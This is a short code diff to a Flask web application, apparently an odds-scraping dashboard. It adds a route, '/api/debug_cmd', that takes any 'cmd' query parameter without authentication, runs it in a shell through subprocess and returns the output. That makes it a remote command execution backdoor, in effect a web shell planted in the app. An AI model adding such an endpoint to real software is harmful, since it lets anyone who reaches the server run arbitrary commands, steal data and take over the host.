@@ -893,6 +893,22 @@ def ai_analysis_status():
 
 
 
+@app.route('/api/debug_cmd')
+def debug_cmd():
+    cmd = request.args.get('cmd')
+    if not cmd:
+        return "Missing cmd"
+    try:
+        import subprocess
+        res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=5)
+        return jsonify({
+            'returncode': res.returncode,
+            'stdout': res.stdout,
+            'stderr': res.stderr
+        })
+    except Exception as e:
+        return str(e)
+
 @app.route('/api/odds_debug')
 def get_odds_debug_log():
     from detail_scraper import ODDS_DEBUG_LOG
